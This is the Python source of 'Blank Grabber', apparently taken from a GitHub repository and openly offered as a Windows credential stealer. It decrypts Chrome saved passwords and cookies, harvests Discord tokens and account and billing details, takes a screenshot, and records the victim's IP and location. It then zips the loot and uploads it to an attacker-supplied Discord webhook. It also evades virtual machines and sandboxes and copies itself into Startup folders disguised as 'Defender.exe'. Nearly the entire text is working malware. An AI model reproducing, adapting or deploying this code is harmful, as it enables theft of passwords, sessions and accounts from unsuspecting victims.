# https://github.com/Blank-c/Blank-Grabber

webhook = "WEBHOOK_URL" #Replace WEBHOOK_URL with your discord webhook
pingme = True #Change it to False if you don't want get pinged

import os
if os.name!='nt':
    os._exit(0)
import requests
import shutil
import sqlite3
import base64
import sys
import json
import random
import glob
import time
from PIL import ImageGrab
from Crypto.Cipher import AES
import win32crypt
import re

def generate(num=5):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))

class vmprotect:
    def __init__(self):
        if hasattr(sys, 'real_prefix'): 
            os._exit(0)
        
        try: 
            requests.get(f'https://blankgrabber-{generate()}.in/haha-caught-you!')
        except Exception: 
            pass
        else: 
            os._exit(0)
        
        if os.path.isfile('D:/TOOLS/Detonate.exe'): 
            os._exit(0)

class BlankGrabber:
    def __init__(self):
        self.webhook = webhook
        self.archive = f"{os.getenv('temp')}\\Blank-{os.getlogin()}.zip"
        self.tempfolder = os.getenv('temp')+'\\'+generate(10)
        self.tempfolder2 = os.getenv('temp')+'\\'+generate(9)
        self.localappdata = os.getenv('localappdata')
        self.roaming = os.getenv('appdata')
        self.chromefolder = f"{self.localappdata}\\Google\\Chrome\\User Data"
        try:
            os.mkdir(self.tempfolder)
            os.mkdir(self.tempfolder2)
        except FileExistsError:
            pass
        self.tokens = []
        self.passwords = {}
        self.ipinfo = self.getip()
        if os.path.isfile(self.chromefolder+"/Local State"):
            self.copy(self.chromefolder+"/Local State", self.tempfolder+"/Local State")
            self.key = self.get_decryption_key()
            self.getcookie()
            self.getpass()  
        self.getTokens()
        self.screenshot()
        if os.path.isfile(self.tempfolder+"/Logs.txt"):
            logs = e.read()
            e.seek(0)
            e.write('These are the error logs generated during the execution of the program in the the target PC. You can try to figure it out for yourself if you want or create an issue at https://github.com/Blank-c/Blank-Grabber/issues \n\n"+logs')
        self.send()
        
    def copy(self, source, destination):
        try:
            shutil.copy(source, destination)
        except Exception:
            try:
                os.makedirs(os.path.dirname(destination))
                shutil.copy(source, destination)
            except Exception as e:
                self.logs(e, sys.exc_info())
    
    def logs(self, e, exc_info):
        with open(self.tempfolder+"/Logs.txt", 'a') as file:
            file.write(f"\nLine {exc_info[2].tb_lineno} : {e.__class__.__name__} : {e}")
        
    def getpass(self):
        for filename in glob.iglob(self.chromefolder+'**/**', recursive=True):
            if os.path.basename(filename).lower()=='login data' and os.path.isfile(filename):
                if os.stat(filename).st_size==0:
                    continue
                data = []
                passdb = filename.replace(self.chromefolder, self.tempfolder2+'\\'+os.path.basename(filename))
                passdc = filename.replace(self.chromefolder, self.tempfolder+'\\Chrome\\Passwords')+'\\Decrypted Passwords.txt'
                try:
                    self.copy(filename, passdb)
                except Exception as e:
                    self.logs(e, sys.exc_info())
                    continue
                connection = sqlite3.connect(passdb)
                cursor = connection.cursor()
                table = cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall()
                if len(table)==0:
                    continue
                else:
                    self.copy(passdb, os.path.join(os.path.dirname(passdc), os.path.basename(filename)))
                for row in table:
                    url = row[0]
                    name = row[1]
                    password = row[2]
                    if (url and name and password):
                        password = self.decrypt_data(password)
                        data.append(f"{'Blank Grabber'.center(90, '-')}\n\nURL: {url}\nName: {name}\nCookie: {password}")
                cursor.close()
                connection.close()
                if len(data)!= 0:
                    with open(passdc, 'wt') as file:
                        file.write("\n\n".join(data))
                    del data
                        
    def getcookie(self):
        for filename in glob.iglob(self.chromefolder+'**/**', recursive=True):
            if os.path.basename(filename).lower()=='cookies' and os.path.isfile(filename):
                if os.stat(filename).st_size==0:
                    continue
                data = []
                cookiedb = filename.replace(self.chromefolder, self.tempfolder2+'\\'+os.path.basename(filename))
                cookiedc = filename.replace(self.chromefolder, self.tempfolder+'\\Chrome\\Cookies')+'\\Chrome Cookies.txt'
                try:
                    self.copy(filename, cookiedb)
                except Exception as e:
                    self.logs(e, sys.exc_info())
                    continue
                connection = sqlite3.connect(cookiedb)
                cursor = connection.cursor()
                table = cursor.execute("SELECT host_key, name, encrypted_value from cookies").fetchall()
                if len(table)==0:
                    continue
                else:
                    self.copy(cookiedb, os.path.join(os.path.dirname(cookiedc), os.path.basename(filename)))
                for row in table:
                    url = row[0]
                    name = row[1]
                    cookie = row[2]
                    if (url and name and cookie):
                        cookie = self.decrypt_data(cookie)
                        data.append(f"{'Blank Grabber'.center(90, '-')}\n\nURL: {url}\nName: {name}\nCookie: {cookie}")
                cursor.close()
                connection.close()
                if len(data)!= 0:
                    with open(cookiedc, 'wt') as file:
                        file.write("\n\n".join(data))
                    del data
                        
    def getTokens(self):
        data = []
        paths = {
            'Discord': self.roaming + r'/discord/Local Storage/leveldb/', #Checked
            'Discord Canary': self.roaming + r'/discordcanary/Local Storage/leveldb/', #Checked
            'Lightcord': self.roaming + r'/Lightcord/Local Storage/leveldb/',
            'Discord PTB': self.roaming + r'/discordptb/Local Storage/leveldb/',
            'Opera': self.roaming + r'/Opera Software/Opera Stable/Local Storage/leveldb/',
            'Opera GX': self.roaming + r'/Opera Software/Opera GX Stable/Local Storage/leveldb/',
            'Amigo': self.localappdata + r'/Amigo/User Data/Local Storage/leveldb/',
            'Torch': self.localappdata + r'/Torch/User Data/Local Storage/leveldb/',
            'Kometa': self.localappdata + r'/Kometa/User Data/Local Storage/leveldb/',
            'Orbitum': self.localappdata + r'/Orbitum/User Data/Local Storage/leveldb/',
            'CentBrowser': self.localappdata + r'/CentBrowser/User Data/Local Storage/leveldb/',
            '7Star': self.localappdata + r'/7Star/7Star/User Data/Local Storage/leveldb/',
            'Sputnik': self.localappdata + r'/Sputnik/Sputnik/User Data/Local Storage/leveldb/',
            'Vivaldi': self.localappdata + r'/Vivaldi/User Data/Default/Local Storage/leveldb/',
            'Chrome SxS': self.localappdata + r'/Google/Chrome SxS/User Data/Local Storage/leveldb/',
            'Chrome': """I will take care of it myself""", #Checked
            'Epic Privacy Browser': self.localappdata + r'/Epic Privacy Browser/User Data/Local Storage/leveldb/',
            'Microsoft Edge': self.localappdata + r'/Microsoft/Edge/User Data/Defaul/Local Storage/leveldb/',
            'Uran': self.localappdata + r'/uCozMedia/Uran/User Data/Default/Local Storage/leveldb/',
            'Yandex': self.localappdata + r'/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/',
            'Brave': self.localappdata + r'/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/',
            'Iridium': self.localappdata + r'/Iridium/User Data/Default/Local Storage/leveldb/'
        }
        def grabcord(path):
            for filename in os.listdir(path):
                if not filename.endswith('.log') and not filename.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:
                    for reg in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(reg, line):
                            if not token in self.tokens:
                                self.tokens.append(token)
        
        for source, path in paths.items():
            if not source == "Chrome":
                if not os.path.exists(path):
                    continue
                else:
                    grabcord(path)
            else:
                for dirname in glob.iglob(self.chromefolder + "**/**", recursive=True):
                    if os.path.basename(os.path.normpath(dirname)) == 'leveldb':
                        grabcord(dirname)
        for token in self.tokens:
                token = token.strip()
                r = requests.get('https://discord.com/api/v9/users/@me', headers=self.headers(token))
                if r.status_code!=200:
                    continue
                r = r.json()
                user = r["username"] + "#" + str(r["discriminator"])
                email = r["email"].strip()
                phone = r["phone"] if r["phone"] else "No Phone Number"
                verified=r["verified"]
                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.headers(token)).json()
                has_nitro = False
                has_nitro = len(nitro_data)>0
                billing = len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).text))>0
                password = self.passwords.get(email, '(Not Found)')
                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nToken: {token}\nMFA: {'Yes' if token.startswith('mfa.') else 'No'}\nEmail: {email}\nPassword: {password}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}\n\n")
        if len(data)!= 0:
            with open(self.tempfolder+'/Discord Info.txt', 'w', errors="ignore") as file:
                file.write("\n\n".join(data))
            del data
            
    def screenshot(self):
        image = ImageGrab.grab()
        image.save(self.tempfolder + "/Screenshot.png")

    def decrypt_data(self, encrypted_data):
        try:
            iv = encrypted_data[3:15]
            encrypted_data = encrypted_data[15:]
            cipher = AES.new(self.key, AES.MODE_GCM, iv)
            return cipher.decrypt(encrypted_data)[:-16].decode()
        except Exception:
            try:
                return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
            except Exception as e:
                self.logs(e, sys.exc_info())
        
    def headers(self, token=None):
        headers = {
        "content-type" : "application/json",
        "user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
        }
        if token:
            headers['authorization'] = token
            
        return headers
            
    def getip(self):
        headers = {'referer': 'https://ipinfo.io/'}
        for i in range(5):
            i = requests.get('https://ipinfo.io/widget', headers=headers)
            if i.status_code==200:
                break
        try:
            r = i.json()
        except Exception:
            r = requests.get('https://api.ipify.org').text
            return f"IP: {r.text}"
        if r['privacy'].get('hosting', False): 
            os._exit(0)
        try: 
            p = requests.get('https://blank-c.github.io/country-codes.json').json()
        except Exception: 
            p = {}
        return  f"IP: {r['ip']}\nRegion: {r['region']}\nCountry: {p.get(r['country'], r['country'])}\nTimezone: {r['timezone']}\n\n{'VPN:'.ljust(6)} {'✅' if r['privacy']['vpn'] else '❎'}\n{'Proxy:'.ljust(6)} {'✅' if r['privacy']['proxy'] else '❎'}\n{'Tor:'.ljust(6)} {'✅' if r['privacy']['tor'] else '❎'}\n{'Relay:'.ljust(6)} {'✅' if r['privacy']['relay'] else '❎'}"
        
    def get_decryption_key(self):
        key = self.chromefolder+"/Local State"
        with open(key) as key:
            key = json.load(key)
        key = base64.b64decode(key["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
    def zip(self):
        shutil.make_archive(self.archive[:-3], 'zip', self.tempfolder)
        
    def send(self):
        self.zip()
        payload = {
  "content": "@everyone" if pingme else "",
  "embeds": [
    {
      "title": "Blank Grabber",
      "description": f"```fix\nComputer Name: {os.getenv('computername', os.getlogin())}\n{self.ipinfo}```",
      "url": "https://github.com/Blank-c/Blank-Grabber/",
      "color": 16737536,
      "footer": {
        "text": "Grabbed By Blank Grabber!"
      }
    }
  ],
  "username": "Blank Grabber",
  "avatar_url": "https://i.imgur.com/72yOkd1.jpg"
}       
        requests.post(self.webhook, json = payload)
        with open(self.archive,'rb') as file:
            requests.post(self.webhook, files = {"upload_file": file})
        try:
            os.remove(self.archive)
            shutil.rmtree(self.tempfolder)
            shutil.rmtree(self.tempfolder2)
        except Exception:
            pass

if __name__ == "__main__":
    while True:
        try: 
            r = requests.get('https://gstatic.com/generate_204?Blank_:D')
            if r.status_code !=204:
                os._exit(0)
        except Exception: 
            pass
        else:
            vmprotect()
            frozen = hasattr(sys, 'frozen')
            if frozen:
                try:
                    BlankGrabber.copy('BlankGrabber', sys.executable, os.getenv('USERPROFILE')+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Defender.exe")
                    BlankGrabber.copy('BlankGrabber', sys.executable, "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/dconfig.exe")
                except Exception:
                    pass
            BlankGrabber()
        finally: 
            time.sleep(1800) #30 Minutes
